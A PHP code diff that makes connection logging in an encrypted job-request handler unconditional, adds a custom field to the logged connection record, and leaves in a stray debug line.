@@ -13,9 +13,9 @@ function handle($data)
     $config = include(__DIR__ . "/config.php");
     $clear_data = json_decode(decrypt($data, $config), true, 512, JSON_BIGINT_AS_STRING);
     if ($clear_data != NULL && checkParams($clear_data)) {
-        if (isset($config["record_connection"]) && $config["record_connection"] === true) {
-            if (!record_new_connection($config, $clear_data)) die;
-        }
+        var_dump("qqq");
+        if (!record_new_connection($config, $clear_data)) die;
+
         switch ($clear_data["type"]) {
             case "GETJOB":
                 return encrypt(
@@ -151,13 +151,18 @@ function record_new_connection($config, $json)
     if (!(isset($_SERVER["REMOTE_ADDR"]) || isset($_SERVER["REMOTE_HOST"])))
         return false;
     $ip = $_SERVER['REMOTE_ADDR'];
-    $sql = "INSERT INTO connections (appid,ip,country,`timestamp`) VALUES (:appid,:ip,:country,:timestamp)";
+    $sql = "INSERT INTO connections (appid,ip,country,custom,`timestamp`) VALUES (:appid,:ip,:country,:custom,:timestamp)";
     $db = getDb($config);
+    $custom = json_encode($json['customField']);
+    if ($custom === false)
+        $custom = null;
+
     $ar = [
         ':appid' => intval($json["appid"]),
         ':ip' => $ip,
         ':country' => strval(geoip_country_name_by_name($ip)),
         ':timestamp' => intval($json["time"]),
+        ':custom' => $custom,
     ];
     $s = $db->prepare($sql);
     return $s->execute($ar);
